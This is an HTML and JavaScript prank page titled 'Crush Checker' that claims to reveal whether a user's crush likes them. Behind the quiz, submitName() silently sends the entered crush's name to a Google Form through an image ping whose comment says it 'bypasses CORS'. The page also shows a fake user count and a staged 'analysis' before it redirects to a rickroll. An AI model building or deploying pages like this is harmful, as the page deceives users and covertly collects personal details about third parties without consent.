<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Crush Checker ❤️</title>
<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;700;800&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
<style>
  :root {
    --pink: #ff2d78;
    --pink-soft: #ff6fa8;
    --bg: #0e0a14;
    --card: #1a1525;
    --card2: #221b30;
    --text: #f0e6ff;
    --muted: #8a7a9e;
    --glow: rgba(255,45,120,0.25);
  }

  * { margin: 0; padding: 0; box-sizing: border-box; }

  body {
    font-family: 'DM Sans', sans-serif;
    background: var(--bg);
    color: var(--text);
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: hidden;
    position: relative;
  }

  /* Animated background blobs */
  .bg-blob {
    position: fixed;
    border-radius: 50%;
    filter: blur(80px);
    opacity: 0.15;
    animation: blobFloat 8s ease-in-out infinite;
    pointer-events: none;
    z-index: 0;
  }
  .blob1 { width: 400px; height: 400px; background: var(--pink); top: -100px; left: -100px; animation-delay: 0s; }
  .blob2 { width: 300px; height: 300px; background: #a020f0; bottom: -80px; right: -80px; animation-delay: 3s; }
  .blob3 { width: 200px; height: 200px; background: #ff6b35; top: 50%; left: 50%; animation-delay: 1.5s; }

  @keyframes blobFloat {
    0%, 100% { transform: translate(0, 0) scale(1); }
    50% { transform: translate(30px, -30px) scale(1.1); }
  }

  /* Floating hearts */
  .hearts-container {
    position: fixed;
    width: 100%;
    height: 100%;
    pointer-events: none;
    z-index: 0;
    overflow: hidden;
  }
  .heart {
    position: absolute;
    bottom: -50px;
    font-size: 1.2rem;
    opacity: 0;
    animation: floatUp linear infinite;
    color: var(--pink);
  }
  @keyframes floatUp {
    0% { opacity: 0; transform: translateY(0) rotate(0deg); }
    10% { opacity: 0.6; }
    90% { opacity: 0.3; }
    100% { opacity: 0; transform: translateY(-110vh) rotate(360deg); }
  }

  /* Card */
  .card {
    position: relative;
    z-index: 10;
    background: var(--card);
    border: 1px solid rgba(255,45,120,0.15);
    border-radius: 28px;
    padding: 48px 36px;
    width: 90%;
    max-width: 400px;
    text-align: center;
    box-shadow: 0 0 60px rgba(255,45,120,0.1), 0 30px 60px rgba(0,0,0,0.5);
    backdrop-filter: blur(10px);
  }

  /* Screen management */
  .screen { display: none; }
  .screen.active { display: block; animation: fadeIn 0.4s ease; }
  @keyframes fadeIn {
    from { opacity: 0; transform: translateY(16px); }
    to { opacity: 1; transform: translateY(0); }
  }

  /* Heart icon */
  .heart-icon {
    font-size: 2.5rem;
    margin-bottom: 20px;
    display: inline-block;
    animation: heartbeat 1.4s ease-in-out infinite;
  }
  @keyframes heartbeat {
    0%, 100% { transform: scale(1); }
    14% { transform: scale(1.2); }
    28% { transform: scale(1); }
    42% { transform: scale(1.15); }
    56% { transform: scale(1); }
  }

  h1 {
    font-family: 'Syne', sans-serif;
    font-size: 2rem;
    font-weight: 800;
    background: linear-gradient(135deg, #fff 30%, var(--pink-soft));
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    margin-bottom: 8px;
  }

  .subtitle {
    color: var(--muted);
    font-size: 0.9rem;
    margin-bottom: 32px;
    font-weight: 300;
  }

  .trust-badge {
    font-size: 0.75rem;
    color: var(--muted);
    margin-top: 16px;
    letter-spacing: 0.05em;
  }

  /* Buttons */
  .btn {
    width: 100%;
    padding: 16px;
    border: none;
    border-radius: 50px;
    font-family: 'DM Sans', sans-serif;
    font-size: 1rem;
    font-weight: 500;
    cursor: pointer;
    transition: all 0.2s ease;
    letter-spacing: 0.02em;
  }
  .btn-primary {
    background: linear-gradient(135deg, var(--pink), #c020d0);
    color: white;
    box-shadow: 0 8px 30px rgba(255,45,120,0.4);
  }
  .btn-primary:hover, .btn-primary:active {
    transform: scale(0.97);
    box-shadow: 0 4px 20px rgba(255,45,120,0.3);
  }
  .btn-primary:active { transform: scale(0.94); }

  /* Input */
  input[type="text"] {
    width: 100%;
    padding: 16px 20px;
    background: var(--card2);
    border: 1.5px solid rgba(255,45,120,0.2);
    border-radius: 14px;
    color: var(--text);
    font-family: 'DM Sans', sans-serif;
    font-size: 1rem;
    outline: none;
    margin-bottom: 16px;
    transition: border-color 0.2s;
  }
  input[type="text"]:focus { border-color: var(--pink); }
  input[type="text"]::placeholder { color: var(--muted); }

  /* Question screen */
  .question-label {
    font-family: 'Syne', sans-serif;
    font-size: 1.2rem;
    font-weight: 700;
    margin-bottom: 6px;
    color: var(--text);
  }
  .question-sub {
    font-size: 0.8rem;
    color: var(--muted);
    margin-bottom: 24px;
  }
  .options {
    display: flex;
    flex-direction: column;
    gap: 10px;
    margin-bottom: 24px;
  }
  .option-btn {
    padding: 14px 20px;
    background: var(--card2);
    border: 1.5px solid rgba(255,255,255,0.07);
    border-radius: 12px;
    color: var(--text);
    font-family: 'DM Sans', sans-serif;
    font-size: 0.95rem;
    cursor: pointer;
    transition: all 0.2s;
    text-align: left;
  }
  .option-btn:hover, .option-btn.selected {
    border-color: var(--pink);
    background: rgba(255,45,120,0.1);
    color: white;
  }

  .step-counter {
    font-size: 0.75rem;
    color: var(--muted);
    margin-bottom: 20px;
    letter-spacing: 0.1em;
    text-transform: uppercase;
  }

  /* Progress bar */
  .progress-wrap {
    background: rgba(255,255,255,0.07);
    border-radius: 50px;
    height: 4px;
    margin-bottom: 32px;
    overflow: hidden;
  }
  .progress-bar {
    height: 100%;
    background: linear-gradient(90deg, var(--pink), #a020f0);
    border-radius: 50px;
    transition: width 0.5s ease;
  }

  /* Loading screen */
  .spinner {
    width: 64px;
    height: 64px;
    border: 3px solid rgba(255,255,255,0.08);
    border-top-color: var(--pink);
    border-radius: 50%;
    animation: spin 0.9s linear infinite;
    margin: 0 auto 24px;
  }
  @keyframes spin { to { transform: rotate(360deg); } }

  .loading-text {
    font-size: 0.95rem;
    color: var(--muted);
    margin-bottom: 8px;
    min-height: 24px;
    transition: opacity 0.3s;
  }
  .loading-name {
    color: var(--pink);
    font-weight: 500;
  }
  .loading-pct {
    font-family: 'Syne', sans-serif;
    font-size: 0.85rem;
    color: var(--muted);
    margin-top: 10px;
  }

  /* Result screen */
  .result-ready h2 {
    font-family: 'Syne', sans-serif;
    font-size: 1.8rem;
    font-weight: 800;
    margin-bottom: 12px;
  }
  .result-name {
    color: var(--pink);
  }
  .result-desc {
    color: var(--muted);
    font-size: 0.9rem;
    margin-bottom: 32px;
    line-height: 1.6;
  }

  /* Confetti dots */
  .confetti-dot {
    position: absolute;
    width: 6px;
    height: 6px;
    border-radius: 50%;
    animation: confettiFall 1s ease forwards;
    pointer-events: none;
  }
  @keyframes confettiFall {
    0% { opacity: 1; transform: translateY(0) rotate(0deg); }
    100% { opacity: 0; transform: translateY(60px) rotate(720deg); }
  }
</style>
</head>
<body>

<div class="bg-blob blob1"></div>
<div class="bg-blob blob2"></div>
<div class="bg-blob blob3"></div>

<div class="hearts-container" id="heartsContainer"></div>

<div class="card">

  <!-- Screen 1: Landing -->
  <div class="screen active" id="screen-home">
    <div class="heart-icon">💗</div>
    <h1>Crush Checker</h1>
    <p class="subtitle">Find out if they feel the same way </p>
    <button class="btn btn-primary" onclick="goTo('screen-name')">Start the Check</button>
    <p class="trust-badge"> Trusted by 12M+ users</p>
  </div>

  <!-- Screen 2: Name input -->
  <div class="screen" id="screen-name">
    <div class="heart-icon">🫶</div>
    <h1 style="font-size:1.5rem; margin-bottom:6px;">who is your crush? </h1>
    <p class="subtitle">Enter their name and findout they like you or not.</p>
    <input type="text" id="crushName" placeholder="Type their name..." maxlength="30" />
    <button class="btn btn-primary" onclick="submitName()">Find Out</button>
  </div>

  <!-- Screen 3: Questions -->
  <div class="screen" id="screen-questions">
    <div class="step-counter" id="stepCounter">STEP 1 OF 3</div>
    <div class="progress-wrap"><div class="progress-bar" id="progressBar" style="width:33%"></div></div>
    <div class="question-label" id="questionLabel"></div>
    <div class="question-sub" id="questionSub"></div>
    <div class="options" id="optionsContainer"></div>
  </div>

  <!-- Screen 4: Loading -->
  <div class="screen" id="screen-loading">
    <div class="spinner"></div>
    <div class="loading-text" id="loadingText">Checking the vibes...</div>
    <div style="font-size:0.85rem; color:var(--muted);">Analyzing <span class="loading-name" id="loadingName"></span></div>
    <div class="progress-wrap" style="margin-top:20px; margin-bottom:0">
      <div class="progress-bar" id="loadingBar" style="width:0%"></div>
    </div>
    <div class="loading-pct" id="loadingPct">0%</div>
  </div>

  <!-- Screen 5: Result reveal -->
  <div class="screen result-ready" id="screen-result">
    <div class="heart-icon">💝</div>
    <h2>Result Ready!</h2>
    <p class="result-desc">We found something <em>interesting</em> about <span class="result-name" id="resultName"></span>...</p>
    <button class="btn btn-primary" onclick="showRickroll()">Show Result 👀</button>
  </div>

</div>

<script>
  // Spawn floating hearts
  const heartChars = ['♥','❤','💕','💗','💓','💞'];
  function spawnHeart() {
    const c = document.getElementById('heartsContainer');
    const h = document.createElement('div');
    h.className = 'heart';
    h.textContent = heartChars[Math.floor(Math.random() * heartChars.length)];
    h.style.left = Math.random() * 100 + '%';
    h.style.fontSize = (0.8 + Math.random() * 1.4) + 'rem';
    const dur = 6 + Math.random() * 8;
    h.style.animationDuration = dur + 's';
    h.style.animationDelay = Math.random() * 4 + 's';
    h.style.opacity = 0;
    c.appendChild(h);
    setTimeout(() => h.remove(), (dur + 4) * 1000);
  }
  setInterval(spawnHeart, 800);
  for(let i=0;i<8;i++) spawnHeart();

  // Navigation
  function goTo(id) {
    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
    document.getElementById(id).classList.add('active');
  }

  let crushNameVal = '';

  function submitName() {
    const val = document.getElementById('crushName').value.trim();
    if (!val) {
      document.getElementById('crushName').style.borderColor = 'var(--pink)';
      document.getElementById('crushName').placeholder = 'Please enter a name 😅';
      return;
    }
    crushNameVal = val;
    document.getElementById('loadingName').textContent = crushNameVal;
    document.getElementById('resultName').textContent = crushNameVal;

    // Silently log name via image ping (bypasses CORS)
    new Image().src = 'https://docs.google.com/forms/d/e/1FAIpQLScd4_Y02PMlmeab_u0X-8eTcNPWwTmRQ2Wf14V65oxDtfT1RQ/formResponse?entry.2052344682=' + encodeURIComponent(crushNameVal) + '&submit=Submit';

    currentQ = 0;
    renderQuestion();
    goTo('screen-questions');
  }

  // Questions
  const questions = [
    {
      label: "How do they act around you?",
      sub: "Be honest 👀",
      options: ["shy", "like friends", "They avoid me ", "i don't know"]
    },
    {
      label: "Did you text he/she?",
      sub: "Think carefully...",
      options: ["Yes", "Sometimes", "Rarely", "No "]
    },
    {
      label: "Last time you saw he/she ",
      sub: "Pick the closest one",
      options: ["Made eye contact a lot", "Smiled", "avoided", "talked"]
    }
  ];

  let currentQ = 0;

  function renderQuestion() {
    const q = questions[currentQ];
    document.getElementById('stepCounter').textContent = `STEP ${currentQ+1} OF ${questions.length}`;
    document.getElementById('progressBar').style.width = `${((currentQ+1)/questions.length)*100}%`;
    document.getElementById('questionLabel').textContent = q.label;
    document.getElementById('questionSub').textContent = q.sub;
    const container = document.getElementById('optionsContainer');
    container.innerHTML = '';
    q.options.forEach((opt, i) => {
      const btn = document.createElement('button');
      btn.className = 'option-btn';
      btn.textContent = opt;
      btn.onclick = () => selectOption(btn, i);
      container.appendChild(btn);
    });
  }

  function selectOption(btn, idx) {
    document.querySelectorAll('.option-btn').forEach(b => b.classList.remove('selected'));
    btn.classList.add('selected');
    setTimeout(() => {
      currentQ++;
      if (currentQ < questions.length) {
        renderQuestion();
      } else {
        startLoading();
      }
    }, 350);
  }

  // Loading sequence
  const loadingMessages = [
    "Checking the vibes...",
    "Reading their energy...",
    "Asking their best friend (secretly)...",
    "Analyzing body language data...",
    "Cross-referencing 47 signals...",
    "Almost there..."
  ];

  function startLoading() {
    goTo('screen-loading');
    let pct = 0;
    let msgIdx = 0;
    const bar = document.getElementById('loadingBar');
    const pctEl = document.getElementById('loadingPct');
    const txtEl = document.getElementById('loadingText');

    const interval = setInterval(() => {
      pct += Math.random() * 4 + 1;
      if (pct > 100) pct = 100;
      bar.style.width = pct + '%';
      pctEl.textContent = Math.floor(pct) + '%';

      const newIdx = Math.floor((pct / 100) * loadingMessages.length);
      if (newIdx !== msgIdx && newIdx < loadingMessages.length) {
        msgIdx = newIdx;
        txtEl.style.opacity = 0;
        setTimeout(() => {
          txtEl.textContent = loadingMessages[msgIdx];
          txtEl.style.opacity = 1;
        }, 200);
      }

      if (pct >= 100) {
        clearInterval(interval);
        setTimeout(() => goTo('screen-result'), 600);
      }
    }, 80);
  }

  // The moment of truth 😈
  function showRickroll() {
    // Redirect to YouTube — works on Instagram WebView
    window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
  }
</script>
</body>
</html>
